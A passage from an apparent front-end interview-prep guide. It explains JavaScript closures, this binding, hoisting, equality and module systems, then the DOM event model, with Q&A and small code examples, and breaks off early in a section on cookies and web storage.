These questions are cheap to ask and enormously discriminating. A closure or `this` snippet takes thirty seconds and instantly reveals depth: does the candidate *derive* the answer from the rules, or guess? Seniors explain the mechanism ("`this` is `undefined` here because it's a plain call in strict mode, and the method was detached from its receiver"); juniors say "I always use arrow functions so I don't have to think about it" — which works until it doesn't (event handlers, methods, prototypes). The loop-variable bug is a favorite because it sits at the intersection of scope *and* the event loop — a genuine two-concept question. Module questions (ESM vs CJS, tree-shaking) probe whether the candidate understands *why* their bundler behaves as it does. None of this is trivia: closures cause real memory leaks, `this` bugs cause real production errors, coercion causes real `==` bugs. Understanding the internals is what lets you debug them without flailing.

**Common confusions**

- "Closures are a special feature you opt into." — Every function is a closure; it always closes over its defining scope. It only *matters* when the function outlives that scope.
- "`this` refers to where the function is defined." — No; for normal functions `this` is set by the **call site**. Only **arrow** functions use the lexical (defining-scope) `this`.
- "`var` isn't hoisted / `let` isn't hoisted." — Both are hoisted; the difference is `var` initializes to `undefined` while `let`/`const` stay uninitialized in the **TDZ** until their declaration.
- "`==` is just `===` with type juggling and it's fine." — `==`'s coercion rules have real gotchas (`0 == ''`, `null == undefined`, `[] == ![]`); use `===` and coerce explicitly.
- "Classes are a different inheritance model from prototypes." — `class` is **syntactic sugar** over prototypes; methods still live on `.prototype`.
- "ESM and CommonJS are interchangeable." — ESM is static and tree-shakeable with live bindings; CJS is dynamic with value copies. Mixing them (`require` an ESM, `import` a CJS) has real interop rules.

**What follows from this topic**

Closures are the language-level view of the heap allocations and leak vectors in [[the-javascript-engine]]; a closure that captures a big object or a DOM node is exactly how "reachable but unused" memory accumulates. The `var`-in-a-loop bug only makes sense once you also understand the [[the-event-loop-async-js]] deferral of the callback. ESM's static structure is what makes the tree-shaking and code-splitting in the bundling/loading topics possible. And `this`/prototype fluency is the substrate under any framework: React hooks exist partly to sidestep `this`, and understanding delegation demystifies how libraries share behavior. Nail these and you stop being surprised by JavaScript.

### Q1. What is a closure? Give a practical use.

A **closure** is a function together with a reference to the **lexical environment** it was defined in. The inner function keeps access to the outer function's variables even after the outer function has returned — those variables stay alive as long as the closure is reachable.

```javascript
function makeCounter() {
  let count = 0;                 // captured by the returned function
  return () => ++count;          // closure over `count`
}
const next = makeCounter();
next(); // 1
next(); // 2  — `count` persisted, private, not global
```

Practical uses: **data privacy / encapsulation** (module pattern, private state without classes), **factory functions** and currying, **memoization** (cache in the closed-over scope), and **event handlers/callbacks** that need to remember context. The one-liner: "a closure lets a function remember and access variables from where it was created, giving you private, persistent state." The flip side is memory — see the leak question.

### Q2. What's the bug, and give three fixes.

```javascript
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);
}
// logs: 3, 3, 3
```

The classic loop-variable bug. `var` is **function-scoped**, so all three callbacks close over the **same single `i`**. By the time the `setTimeout` callbacks run (after the loop finishes — an event-loop deferral), `i` is `3`. Fixes:

```javascript
// 1. let — block-scoped: a NEW binding per iteration → 0,1,2
for (let i = 0; i < 3; i++) setTimeout(() => console.log(i), 0);

// 2. IIFE — capture the current value in a new scope (pre-ES6 idiom)
for (var i = 0; i < 3; i++) {
  ((j) => setTimeout(() => console.log(j), 0))(i);
}

// 3. bind the value as an argument
for (var i = 0; i < 3; i++) setTimeout(console.log, 0, i);
```

The key insight to state: it's two concepts at once — **`var`'s function scope** (one shared variable) plus **the event loop deferring the callback** until after the loop mutated it. `let` fixes it because the spec creates a fresh binding each iteration.

### Q3. Explain the prototype chain and `[[Prototype]]`.

Every JS object has an internal `[[Prototype]]` link to another object (or `null`). When you read a property, the engine checks the object itself, then its `[[Prototype]]`, then *that* object's prototype, and so on up the **prototype chain** until it finds the property or reaches `null` (yielding `undefined`).

```javascript
const animal = { eats: true };
const dog = Object.create(animal);   // dog.[[Prototype]] === animal
dog.barks = true;

dog.barks;  // true  (own property)
dog.eats;   // true  (found on animal via the chain)
dog.flies;  // undefined (chain exhausted)

Object.getPrototypeOf(dog) === animal; // true
```

This is **delegation**, not copying: `dog` doesn't have `eats`; it borrows it. Writes, though, create an **own** property on the object (shadowing). Arrays delegate to `Array.prototype`, plain objects to `Object.prototype` (which has `null` as its prototype). This chain is what method sharing, `instanceof`, and `class` inheritance are all built on.

### Q4. How does `class` relate to prototypes?

`class` is **syntactic sugar** over the prototype system — it does not introduce a new inheritance model. Methods you define in a class body are placed on the constructor's `.prototype` object, shared by all instances; `extends` sets up the prototype chain between the two.

```javascript
class Animal {
  constructor(name) { this.name = name; }
  speak() { return `${this.name} makes a sound`; } // on Animal.prototype
}
class Dog extends Animal {
  speak() { return `${this.name} barks`; }         // on Dog.prototype
}

// Equivalent prototype wiring:
// Dog.prototype.[[Prototype]] === Animal.prototype
const d = new Dog('Rex');
Object.getPrototypeOf(d) === Dog.prototype;                 // true
Object.getPrototypeOf(Dog.prototype) === Animal.prototype;  // true
```

Differences from the raw prototype approach are mostly ergonomic/strictness: class bodies run in strict mode, methods are non-enumerable, `class` isn't hoisted (TDZ), and you must call with `new`. But under the hood it's the same `[[Prototype]]` delegation from Q3.

### Q5. What are the rules for `this` binding?

`this` is decided at the **call site** by five rules, checked roughly in priority order:

1. **`new` binding** — `new Fn()` makes `this` a fresh object.
2. **Explicit binding** — `fn.call(obj)`, `fn.apply(obj)`, `fn.bind(obj)` force `this = obj`.
3. **Implicit binding** — `obj.fn()` sets `this = obj` (the object left of the dot).
4. **Default binding** — a plain call `fn()` gives `this = undefined` in strict mode (or the global object in sloppy mode).
5. **Arrow functions** — no own `this`; they **lexically inherit** `this` from the enclosing scope, ignoring all the above.

```javascript
function show() { return this?.label; }
const obj = { label: 'A', show };
show();                 // undefined (default, strict)
obj.show();             // 'A'       (implicit)
show.call({label:'B'}); // 'B'       (explicit)
new show();             // this = new object (new)
```

The senior move is naming *which rule applies* to a given snippet, and knowing arrow functions opt out entirely.

### Q6. What does this log, and why?

```javascript
const user = {
  name: 'alice',
  greetLater() {
    setTimeout(function () { console.log(this.name); }, 0);
  },
  greetLaterArrow() {
    setTimeout(() => console.log(this.name), 0);
  },
};
user.greetLater();       // ?
user.greetLaterArrow();  // ?
```

`greetLater` logs **`undefined`** (or throws in strict mode); `greetLaterArrow` logs **`'alice'`**.

In `greetLater`, the callback is a **normal function** invoked by the timer as a plain call — **default binding** — so its `this` is not `user` (it's `undefined`/`globalThis`), and `this.name` isn't `'alice'`. In `greetLaterArrow`, the arrow has **no own `this`**; it lexically captures `this` from `greetLaterArrow`, which was called as `user.greetLaterArrow()` (implicit binding → `this === user`). This is the single most common `this` bug — a method passed as a callback loses its receiver — and the reason arrow functions (or `.bind(this)`) are the standard fix for callbacks that need the surrounding `this`.

### Q7. Explain hoisting for `var`, `let`/`const`, and function declarations.

**Hoisting** means declarations are registered when the engine enters a scope, before executing it — but the three kinds behave differently:

```javascript
console.log(a); // undefined  (var hoisted, initialized to undefined)
console.log(fn()); // 'hi'    (function declaration fully hoisted)
console.log(b); // ReferenceError (let in TDZ)

var a = 1;
let b = 2;
function fn() { return 'hi'; }
```

- **`var`** — declaration hoisted, **initialized to `undefined`**; reading before the assignment gives `undefined`, not an error.
- **Function declarations** — **entire function** (name + body) hoisted; callable before its line. (Function *expressions* assigned to `var`/`let` are not.)
- **`let` / `const` / `class`** — hoisted but **left uninitialized** in the **TDZ**; any access before the declaration line throws `ReferenceError`.

The mental model: the engine does a "declaration pass" then a "run pass." `var` gets a placeholder value; `let`/`const` get a "do not touch yet" flag.

### Q8. What is the Temporal Dead Zone?

The **TDZ** is the region of a scope from its start up to the point where a `let`/`const`/`class` variable is actually declared. The binding *exists* (it's hoisted) but is **uninitialized**, so any read or write throws `ReferenceError: Cannot access 'x' before initialization`.

```javascript
{
  // TDZ for `x` starts here
  // console.log(x);  // ReferenceError
  typeof x;           // ALSO ReferenceError (not 'undefined'!)
  let x = 5;          // TDZ ends — x initialized
  console.log(x);     // 5
}
```

Why it exists: it makes `let`/`const` catch use-before-declaration bugs that `var`'s silent `undefined` hides, and it's required for `const` to be meaningful (you can't observe it before its one assignment). A notable gotcha: `typeof` on a TDZ variable **throws**, whereas `typeof` on a truly undeclared variable returns `'undefined'` — so the TDZ is stricter than "not defined yet."

### Q9. `var` vs `let` vs `const` — when do you use each?

| | `var` | `let` | `const` |
|---|---|---|---|
| Scope | Function | Block | Block |
| Hoisting | To `undefined` | TDZ | TDZ |
| Reassignable | Yes | Yes | No |
| Redeclarable in scope | Yes | No | No |
| Creates global property (top level) | Yes | No | No |

Guidance: **`const` by default**, **`let` when you must reassign**, **`var` essentially never** in modern code. `const` prevents *reassignment*, not mutation — `const arr = []; arr.push(1)` is fine because the binding still points at the same array. Block scoping (`let`/`const`) is what makes the loop-var bug (Q2) go away and prevents accidental leakage of loop counters and temporaries. `var`'s function scope, hoisting-to-`undefined`, and global-property creation are all footguns preserved only for legacy compatibility.

### Q10. `==` vs `===` — what actually happens, and which do you use?

`===` (strict equality) compares **type and value with no coercion**: different types → `false`, immediately. `==` (loose equality) applies the **abstract equality algorithm**, coercing operands toward a common type first, which produces surprising results.

```javascript
0 == '';         // true   (both coerce to 0)
0 == '0';        // true
'' == '0';       // false  (!)  — string vs string, no coercion, not equal
null == undefined; // true (special-cased)
null == 0;       // false  (null only == undefined)
NaN == NaN;      // false  (NaN equals nothing)
[] == ![];       // true   ([] → '' → 0, ![] → false → 0)
```

Because the coercion rules are non-transitive and full of edge cases, the rule is: **always use `===`** (and `!==`), and coerce **explicitly** (`Number(x)`, `String(x)`, `Boolean(x)`) when you need a conversion. The one common exception people allow is `x == null` as a concise check for "`null` **or** `undefined`." Also prefer `Object.is` for the `NaN`/`-0` edge cases (`Object.is(NaN, NaN) === true`).

### Q11. What are the falsy values, and how does truthiness cause bugs?

There are exactly **8 falsy** values; everything else is truthy:

```text
false, 0, -0, 0n (BigInt zero), "" (empty string), null, undefined, NaN
```

Note `'0'`, `'false'`, `[]`, `{}`, and functions are all **truthy**. The classic bug is using a truthiness check where you meant "is it present," conflating "empty/zero" with "missing":

```javascript
function setVolume(v) {
  if (!v) v = 50;   // BUG: volume 0 becomes 50; '' or NaN also slip through
}
// fix: check for the actual absent values
function setVolume(v) {
  if (v == null) v = 50;          // null or undefined only
  // or: v = v ?? 50;             // nullish coalescing — 0 is preserved
}
```

`??` (nullish coalescing) and `?.` (optional chaining) exist precisely to distinguish "nullish" from "falsy." Use `??` when `0`/`''`/`false` are valid values you must not overwrite, and `||` only when any falsy value should trigger the default.

### Q12. Spot the memory leak.

```javascript
function attach() {
  const bigData = new Array(1_000_000).fill('x'); // large
  const el = document.getElementById('btn');
  el.addEventListener('click', function () {
    console.log(bigData.length); // closure captures bigData
  });
}
```

The listener's callback **closes over `bigData`**, so as long as the listener is attached (and the element is alive), the million-element array can never be garbage collected — even though nothing else uses it. Attach this in a component that mounts/unmounts repeatedly and the heap climbs.

Two fixes: **capture only what you need**, and **remove the listener** on teardown.

```javascript
function attach() {
  const len = new Array(1_000_000).fill('x').length; // keep the number, drop the array
  const el = document.getElementById('btn');
  const onClick = () => console.log(len);
  el.addEventListener('click', onClick);
  return () => el.removeEventListener('click', onClick); // cleanup → both become collectable
}
```

This is the language-level face of the leak discussion in [[the-javascript-engine]]: a closure is "reachable but unused" memory. Also watch **detached DOM nodes** kept alive by such closures.

### Q13. What's the difference between ESM and CommonJS?

Two module systems with different loading semantics; ESM (`import`/`export`) is the modern standard, CommonJS (`require`/`module.exports`) is Node's legacy default.

| | ESM | CommonJS |
|---|---|---|
| Syntax | `import` / `export` | `require` / `module.exports` |
| Resolution | **Static** (analyzed before execution) | **Dynamic** (runs at call time) |
| Loading | Asynchronous | Synchronous |
| Bindings | **Live** (imports reflect later changes) | **Copies** of values at require time |
| Tree-shakeable | **Yes** (static structure) | No (dynamic) |
| Mode | Strict by default | Sloppy by default |
| `this` at top level | `undefined` | `module.exports` |

```javascript
// ESM — static, hoisted, tree-shakeable
import { debounce } from './utils.js';
export const x = 1;

// CommonJS — dynamic, can be conditional
const { debounce } = require('./utils');
module.exports = { x: 1 };
```

The front-end-relevant payoff: because ESM imports are **statically analyzable**, bundlers can **tree-shake** unused exports and **code-split** — impossible with CJS's dynamic `require`. This is why the ecosystem moved to ESM and why `"type": "module"` / `.mjs` matters.

### Q14. Why is ESM's static structure important for bundlers?

Because "static" means the bundler can determine **the entire import/export graph without running the code**. That unlocks the optimizations the loading-performance topic depends on:

- **Tree-shaking** — dead-code elimination: if `import { a } from 'lib'` never uses `b`, and `b` is a separate export with no side effects, the bundler drops `b` entirely, so it's never shipped or parsed.
- **Code splitting** — `import()` (dynamic) marks a split point; the bundler emits a separate chunk loaded on demand.
- **Scope hoisting / better minification** — knowing bindings statically lets the bundler concatenate modules and rename aggressively.

```javascript
import { debounce } from 'lodash-es'; // only debounce ends up in the bundle
// vs. CommonJS: require('lodash') is dynamic → whole library pulled in
```

CommonJS's `require` can be called conditionally, with a computed path, anywhere — so the bundler can't safely prove what's unused and must include more. The practical rule: import **named exports from ESM builds** (`lodash-es`, not `lodash`) to get tree-shaking, and use dynamic `import()` for route-level splitting. This connects language internals straight to bundle size and load performance.

### Q15. Explain scope and the scope chain.

**Scope** is the set of variables accessible at a given point in code; JS uses **lexical (static) scope** — determined by where code is *written*, not where it's called. When you reference a variable, the engine looks in the **current scope**, then the **enclosing** scope, outward through the **scope chain** to the global scope; first match wins, else `ReferenceError`.

```javascript
const g = 'global';
function outer() {
  const o = 'outer';
  function inner() {
    const i = 'inner';
    console.log(i, o, g); // resolves i (own) → o (outer) → g (global)
  }
  inner();
}
```

Scope kinds: **global**, **function** (`var`, params), **block** (`let`/`const`/`class` inside `{}`), and **module**. Closures (Q1) are exactly this scope chain being *kept alive* after the outer function returns. The distinction to nail in an interview: lexical scope is fixed at author time (unlike `this`, which is dynamic at call time) — nesting in the source, not the call stack, decides what a variable can see.

### Q16. What does `typeof` return for the various types, and where does it lie?

`typeof` returns a string naming the operand's type; it's the safe way to test a variable that might be undeclared (it never throws for undeclared names — except in the TDZ, Q8).

```javascript
typeof undefined     // 'undefined'
typeof true          // 'boolean'
typeof 42            // 'number'
typeof 42n           // 'bigint'
typeof 'hi'          // 'string'
typeof Symbol()      // 'symbol'
typeof function(){}  // 'function'
typeof {}            // 'object'
typeof []            // 'object'   ← arrays are objects
typeof null          // 'object'   ← the famous historical bug
```

Two well-known "lies": **`typeof null === 'object'`** (a bug preserved since JS's first release for backward compatibility — use `x === null` to test for null), and **`typeof []`/`typeof {}` are both `'object'`** (distinguish with `Array.isArray(x)`). Functions are the one callable object `typeof` singles out as `'function'`. For precise type/class checks beyond `typeof`, reach for `Array.isArray`, `instanceof`, or `Object.prototype.toString.call(x)` (which yields e.g. `'[object Date]'`).
## The DOM Event Model

### Summary

**What this topic covers**

How events actually flow through the DOM tree and how to handle them without leaking memory or tanking scroll performance. Three concern areas: (1) **propagation** — the three phases (capture → target → bubble) and how a single click reaches every ancestor in a deterministic order; (2) **registration** — `addEventListener` and its options (`capture`, `once`, `passive`), plus the controls a handler has over propagation and default behaviour (`preventDefault`, `stopPropagation`, `stopImmediatePropagation`); and (3) **patterns** — event delegation (one listener on a parent instead of N on children), custom events for decoupled component communication, and the lifecycle discipline of removing listeners so detached nodes can be garbage-collected. The 16 questions here move from "what bubbles" warm-ups to senior scenarios like diagnosing a `passive`-listener scroll jank or a listener-leak in a re-rendering list. Frameworks' synthetic-event systems (React) are covered only as a wrapper over this same model.

**Mental model**

An event is not delivered to one element — it travels a **path**. When you click a `<button>` deep in the tree, the browser computes the path from `document` down to the button (the target) and back up. It then dispatches the event in three phases along that path: **capturing** (root → target), **at target**, and **bubbling** (target → root). Every `addEventListener` you registered along that path fires, in phase order, unless someone stops it. This is why delegation works: a listener on a shared ancestor sees events from all its descendants because the event bubbles up through it. Think of the DOM as a series of nested boxes and the event as a pebble dropped through them and bounced back — handlers can be attached to the walls on the way down (capture) or the way up (bubble). Most handlers you write are bubble-phase because that's the default. The other half of the model is **control**: `preventDefault` cancels the browser's built-in reaction (following a link, submitting a form) but does NOT stop propagation; `stopPropagation` halts the journey but does NOT cancel the default. They're orthogonal.

**Key terms**

- **Capturing phase** — event travels from the root down to the target; listeners opt in with `{ capture: true }`.
- **Target phase** — the event reaches `event.target`, the element actually interacted with.
- **Bubbling phase** — event travels back up from target to root; the default phase for listeners.
- **`event.target` vs `event.currentTarget`** — `target` is where it originated; `currentTarget` is the element whose listener is currently running (the one you attached to).
- **Event delegation** — attaching one listener to a common ancestor and using `event.target` to handle events from many descendants.
- **`passive: true`** — promises the handler won't call `preventDefault`, letting the browser scroll without waiting for JS; critical for `touchmove`/`wheel` scroll perf.
- **`once: true`** — auto-removes the listener after it fires a single time.
- **`preventDefault()`** — cancels the browser's default action; does not stop propagation.
- **`stopPropagation()`** — stops the event travelling further along the path; other listeners on the same element still run.
- **`stopImmediatePropagation()`** — stops propagation AND prevents other listeners on the same element from running.
- **`CustomEvent`** — a developer-defined event carrying arbitrary data via `detail`, dispatched with `dispatchEvent`.
- **Synthetic event** — a framework-normalised wrapper (e.g. React's `SyntheticEvent`) over the native event, pooled/delegated for cross-browser consistency.

**Why interviewers ask this**

The event model separates people who copy `onClick` handlers from people who understand what the browser is doing. Junior signal: knows clicks "bubble," attaches a listener, done. Senior signal: reaches for delegation when rendering a 1,000-row table (one listener, not a thousand), knows why `stopPropagation` in a component can silently break a parent's outside-click handler, knows that a non-`passive` `touchmove` listener forces the browser to wait for JS before scrolling and causes jank, and knows that forgotten listeners on detached nodes are a classic memory leak. It's also a proxy for framework literacy — being able to explain that React attaches one delegated listener at the root and hands you a pooled synthetic event shows you understand what your framework abstracts.

**Common confusions**

- "`preventDefault` and `stopPropagation` do the same thing" — no. One cancels the default action, the other stops the event travelling. You often want one without the other.
- "`event.target` is the element I attached the listener to" — that's `currentTarget`. `target` is where the event originated, which in delegation is a descendant.
- "Events only bubble" — they capture first, then bubble. Some events (`focus`, `blur`, `scroll`, `mouseenter`) don't bubble at all; use the capturing/`focusin`/delegation-aware variants.
- "`passive` makes events faster" — it doesn't speed the handler; it lets the browser start scrolling immediately instead of blocking on JS that might call `preventDefault`.
- "Delegation needs a library" — it's just one native listener plus `event.target.closest()`.

**What follows from this topic**

Listener leaks connect directly to the runtime-performance and memory-leak material (detached DOM nodes retained by live listeners). Passive listeners tie into the reflow/scroll-jank discussion in web performance. Custom events and delegation underpin Web Components and framework rendering. And the "one delegated listener at the document root" pattern is exactly what React's synthetic event system industrialises — so this topic is the vanilla foundation under your framework's event handling.

### Q1. What are the three phases of DOM event propagation?

When an event fires, the browser computes the path from the document root to the target and dispatches in three phases:

```
                  │  1. CAPTURE (root → target)
   document       ▼
     └─ <body>
          └─ <div>          2. TARGET (at the element)
               └─ <button>  ◄── event.target
          ▲
          │  3. BUBBLE (target → root)
```

1. **Capturing** — from `document` down to the target. Listeners only participate if registered with `{ capture: true }`.
2. **Target** — the event reaches `event.target`.
3. **Bubbling** — back up from target to `document`. This is the **default** phase; `element.addEventListener('click', fn)` fires here.

Most handlers are bubble-phase, which is exactly what makes event delegation possible — a parent sees events that started on its children.

### Q2. What's the difference between `event.target` and `event.currentTarget`?

- **`event.target`** — the element where the event *originated* (what the user actually clicked).
- **`event.currentTarget`** — the element whose listener is *currently executing* (the one you called `addEventListener` on). Same as `this` in a non-arrow handler.

They differ precisely when the listener is on an ancestor:

```javascript
list.addEventListener('click', (e) => {
  console.log(e.currentTarget); // always <ul id="list">
  console.log(e.target);        // the <li> or <button> actually clicked
});
```

This is the whole basis of delegation: `currentTarget` is your fixed listener host, `target` tells you which descendant triggered it.

### Q3. What is event delegation and why does it scale better than per-element listeners?

Delegation means attaching **one** listener to a common ancestor and dispatching based on `event.target`, instead of one listener per child.

```javascript
// Instead of N listeners:
document.querySelectorAll('.row').forEach(r =>
  r.addEventListener('click', handle));

// One listener, delegated:
table.addEventListener('click', (e) => {
  const row = e.target.closest('.row');
  if (!row) return;              // clicked outside any row
  handle(row.dataset.id);
});
```

Why it scales:

- **Memory** — one listener object instead of thousands.
- **Dynamic content** — rows added later are handled automatically; no need to re-bind on every render or DOM insertion.
- **Setup cost** — no loop attaching listeners at mount.

The trade-off: it relies on bubbling, so it doesn't work directly for non-bubbling events (`focus`, `blur` — use `focusin`/`focusout` or capture), and you must guard with `closest()` to ignore clicks that miss your targets.

### Q4. Explain `stopPropagation` vs `preventDefault` vs `stopImmediatePropagation`.

They're orthogonal controls:

- **`preventDefault()`** — cancels the browser's *default action* (following a link, submitting a form, checking a checkbox). Propagation continues normally.
- **`stopPropagation()`** — stops the event travelling further along the path. Other listeners *on the same element* still run. The default action still happens.
- **`stopImmediatePropagation()`** — stops propagation AND prevents any *other listeners on the same element* from firing.

```javascript
form.addEventListener('submit', (e) => {
  e.preventDefault();   // don't reload the page...
  // ...but the submit event still bubbles to ancestors
});
```

Common bug: calling `stopPropagation()` inside a component to "contain" a click, which then silently breaks a parent's document-level outside-click handler. Prefer checking `event.target` over stopping propagation when you can.

### Q5. What does the `passive` option do and how does it affect scroll performance?

`{ passive: true }` promises the browser your handler will **not** call `preventDefault()`. That's a big deal for `wheel`, `touchstart`, and `touchmove`.

Without it, the browser can't start scrolling until your JS runs, because your handler *might* cancel the scroll. On a busy main thread that stalls the scroll and produces jank. With `passive`, the browser scrolls immediately on the compositor and runs your handler in parallel.

```javascript
el.addEventListener('touchmove', onMove, { passive: true });
```

Modern browsers already default `passive: true` for `touchstart`/`touchmove`/`wheel` on `document`, `window`, and `body`. If you genuinely need to block scroll (e.g. a custom gesture), you must register non-passive and call `preventDefault` — and accept the perf cost. Calling `preventDefault` inside a passive listener is ignored (with a console warning).

### Q6. What's the difference between `mouseenter`/`mouseleave` and `mouseover`/`mouseout`?

- **`mouseover`/`mouseout`** — fire every time the pointer crosses into or out of a child element too, and they **bubble**. Moving between children of a hovered element fires repeated events.
- **`mouseenter`/`mouseleave`** — fire only when the pointer enters/leaves the bound element as a whole, ignore child boundaries, and do **not** bubble.

For a simple "am I hovering this card" you want `mouseenter`/`mouseleave` — no re-firing as the cursor moves over inner content. For delegation you're forced to use `mouseover`/`mouseout` (since enter/leave don't bubble) and filter with `event.target`/`relatedTarget`.

### Q7. How do you create and dispatch a custom event, and when is that useful?

```javascript
// Dispatch, carrying data in `detail`
const evt = new CustomEvent('cart:add', {
  detail: { sku: 'abc-123', qty: 2 },
  bubbles: true,     // so ancestors can listen via delegation
});
cartButton.dispatchEvent(evt);

// Listen anywhere up the tree
document.addEventListener('cart:add', (e) => {
  console.log(e.detail.sku, e.detail.qty);
});
```

Useful for **decoupled communication**: a low-level component announces "something happened" without knowing who listens. It's the DOM-native version of a pub/sub bus and underpins Web Components, which emit custom events as their public API. Set `bubbles: true` if you want ancestors/delegation to catch it; add `composed: true` to cross shadow-DOM boundaries.

### Q8. What are synthetic events and why do frameworks use them?

A **synthetic event** is a framework's normalised wrapper over the native browser event. React is the canonical example: rather than attaching listeners to each DOM node, React attaches a small number of **delegated** listeners at the root container and, when a native event fires, constructs a `SyntheticEvent` and routes it through your component tree following React's own bubbling model.

Why: (1) **cross-browser consistency** — one normalised shape regardless of engine quirks; (2) **performance** — root-level delegation instead of thousands of native listeners; (3) **integration** — event handling participates in the framework's batching/rendering. Practical gotchas: `e.stopPropagation()` on a synthetic event stops it in React's tree but the *native* event may still propagate; and mixing native `addEventListener` with synthetic handlers can produce surprising ordering. Understanding this topic is what lets you reason about those edge cases.

### Q9. Spot the memory leak: a component adds a `resize` listener but never removes it.

```javascript
function mountWidget() {
  const state = { data: hugeArray };      // large closure
  function onResize() { render(state); }
  window.addEventListener('resize', onResize);
  // ...widget later removed from the DOM, but no cleanup
}
```

The leak: `window` holds a reference to `onResize`, which closes over `state` (and its `hugeArray`). Even after the widget's DOM is removed, the listener keeps the closure — and everything it captures — alive forever. Repeated mounts stack up listeners and retained heap.

Fix — always pair add with remove:

```javascript
function mountWidget() {
  const onResize = () => render(state);
  window.addEventListener('resize', onResize);
  return () => window.removeEventListener('resize', onResize); // cleanup
}
```

Note `removeEventListener` needs the **same function reference** — an inline arrow can't be removed. Modern alternative: pass an `AbortController` signal and call `controller.abort()` to remove all listeners at once. This is why React's `useEffect` returns a cleanup function.

### Q10. How does `AbortController` simplify listener cleanup?

Pass a signal to `addEventListener` and abort it to remove every listener registered with that signal in one call — no need to keep individual function references:

```javascript
const ctrl = new AbortController();
el.addEventListener('click', onClick, { signal: ctrl.signal });
window.addEventListener('resize', onResize, { signal: ctrl.signal });
document.addEventListener('keydown', onKey, { signal: ctrl.signal });

// Later — one call removes all three:
ctrl.abort();
```

The same controller also cancels a `fetch`, so a component teardown can abort in-flight requests and detach listeners together. It's the cleanest cleanup primitive for anything with a lifecycle.

### Q11. Why doesn't `focus` bubble, and how do you delegate focus events?

`focus` and `blur` do **not** bubble — historically because focus is a single-element concern. That breaks naive delegation (a listener on a parent won't hear a child's `focus`).

Two fixes:

1. **`focusin`/`focusout`** — the bubbling variants. Register these on the ancestor.
2. **Capture phase** — `parent.addEventListener('focus', fn, { capture: true })` sees focus events on the way down, since capture runs regardless of bubbling.

```javascript
form.addEventListener('focusin', (e) => {
  e.target.closest('.field')?.classList.add('active');
});
```

### Q12. In what order do capture and bubble listeners on the same path fire?

Along the path root → target → root:

1. All **capture** listeners, root down to target.
2. At the target, listeners fire in **registration order** (capture flag is ignored at the target itself in practice — both run in the order added).
3. All **bubble** listeners, target up to root.

```javascript
document.body.addEventListener('click', () => log('body capture'), true);
document.body.addEventListener('click', () => log('body bubble'));
btn.addEventListener('click', () => log('btn'));
// Click btn → "body capture", "btn", "body bubble"
```

So a capture listener on an ancestor is the earliest hook you have — useful for global gatekeeping (e.g. intercepting clicks before any component handles them).

### Q13. How would you implement a one-time initialization on first user interaction?

Use `{ once: true }` — the listener auto-removes after firing once, so no manual cleanup:

```javascript
document.addEventListener('pointerdown', initAudio, { once: true });
```

Common for unlocking audio/video autoplay (which requires a user gesture) or lazy-initialising something expensive on first interaction. Before `once` existed you had to remove the listener from inside itself, which required a named reference. Combine with `passive` where relevant: `{ once: true, passive: true }`.

### Q14. Why is calling `preventDefault` on a passive listener ignored?

Because `passive: true` is a *promise* to the browser that you won't cancel the default action — the browser relies on that promise to start scrolling without waiting for your JS. If it then let you call `preventDefault`, the guarantee would be meaningless. So the call is a no-op and you get a console warning.

The lesson: choose intent up front. Need to block the default (custom swipe, pinch-zoom prevention)? Register **non-passive** and accept the main-thread dependency. Just observing (analytics, parallax)? Register **passive** and keep scrolling smooth.

### Q15. What is `event.stopImmediatePropagation` good for that `stopPropagation` isn't?

`stopPropagation` still lets *other listeners on the same element* run; `stopImmediatePropagation` also blocks those.

```javascript
btn.addEventListener('click', (e) => { e.stopImmediatePropagation(); A(); });
btn.addEventListener('click', () => B()); // never runs
```

Realistic use: a validation or rate-limit guard registered first on an element that must veto later handlers on that same element (e.g. a "disabled while submitting" gate) — not just ancestors. It's a sharp tool; overusing it makes handler ordering load-bearing and fragile.

### Q16. A list re-renders and clicks stop working / fire twice. What's likely wrong, and how does delegation fix it?

Two classic causes:

- **Clicks stop working** — you re-rendered the list by replacing innerHTML, which destroyed the old nodes *and* their attached listeners. New nodes have none.
- **Clicks fire twice** — you re-ran your "attach listeners" code on re-render without removing the old ones, stacking duplicate listeners on surviving nodes.

Delegation eliminates both. One listener on the stable parent survives any child re-render, and because it's a single listener you never double-bind:

```javascript
list.addEventListener('click', (e) => {
  const item = e.target.closest('[data-id]');
  if (item) select(item.dataset.id);
});
// Re-render list.innerHTML freely — the parent listener persists.
```

This is exactly why frameworks delegate at the root rather than binding per element.

## Cookies, Sessions & Web Storage

### Summary

**What this topic covers**

Where the browser keeps state and how to pick the right store for a given job — the security and performance trade-offs, not just the APIs. Three concern areas: (1) **cookies** — their attributes (`HttpOnly`, `Secure`, `SameSite`, `Domain`/`Path`, `Expires`/`Max-Age`), the ~4KB limit, and the fact that they're attached to *every matching request*, which has real performance and security consequences; (2) **sessions & auth** — the classic server-side session (an opaque session id in a cookie) versus stateless tokens (JWT), and where each stores what; and (3) **client storage** — `localStorage` vs `sessionStorage` vs cookies vs IndexedDB vs the Cache API, compared on persistence, size, sync/async, scope, whether they're sent to the server, and their XSS exposure. The 16 questions run from "cookie vs localStorage" warm-ups to senior calls like "where do you store an auth token and why" and "why is this cookie bloating every request." This is the topic that connects storage choices to the browser security model.

**Mental model**

Group browser storage by two axes: **is it sent to the server automatically, and can JavaScript read it?** Cookies are the only store the browser attaches to outgoing requests on its own — that's their superpower (the server sees them without JS) and their tax (they ride on *every* matching request, including images and API calls, and they're a CSRF vector). `HttpOnly` cookies are invisible to JS, which is exactly why they're the safe home for session ids and tokens: an XSS payload can't read them. Everything else — `localStorage`, `sessionStorage`, IndexedDB, Cache API — is **client-only** (never auto-sent) and **JS-readable** (so anything XSS can steal it). Within that group, choose by size and shape: small key-value strings → `localStorage`/`sessionStorage`; large structured data or blobs → IndexedDB; HTTP responses for offline → Cache API. The single most important decision this model drives: **never put anything an attacker could weaponise (session tokens) in JS-readable storage** — put it in an `HttpOnly`, `Secure`, `SameSite` cookie.

**Key terms**

- **Cookie** — a small (~4KB) key-value string the browser stores per-origin and auto-attaches to matching requests via the `Cookie` header.
- **`HttpOnly`** — cookie flag making the cookie unreadable from JavaScript (`document.cookie`); defends against XSS token theft.
- **`Secure`** — cookie only sent over HTTPS.
- **`SameSite`** — controls whether a cookie is sent on cross-site requests: `Strict` (never cross-site), `Lax` (top-level GET navigations only — the modern default), `None` (always, requires `Secure`).
- **`Domain`/`Path`** — scope: which host(s) and URL paths the cookie is sent to.
- **`Expires`/`Max-Age`** — lifetime; absent both = a *session cookie* deleted when the browser/tab session ends.
